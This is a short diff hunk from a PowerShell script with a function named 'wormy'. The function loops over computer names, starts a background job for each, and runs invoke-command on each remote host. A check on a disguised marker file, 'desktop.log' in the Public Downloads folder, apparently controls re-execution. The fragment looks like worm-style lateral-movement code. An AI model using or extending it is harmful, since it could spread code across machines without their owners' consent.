@@ -117,7 +117,7 @@ function wormy{
         Foreach($i in $computerNames){
             Write-Output $i
             start-job{
-            invoke-command -ComputerName $args -ScriptBlock {
+            invoke-command $args -ScriptBlock {
                 if(Test-Path 'C:\Users\Public\Downloads\desktop.log' ){
                     if((get-content -path 'C:\Users\Public\Downloads\desktop.log') -lt ([int][double]::Parse((get-date -UFormat %s))) - 30){
                         Invoke-Command $args -ScriptBlock {
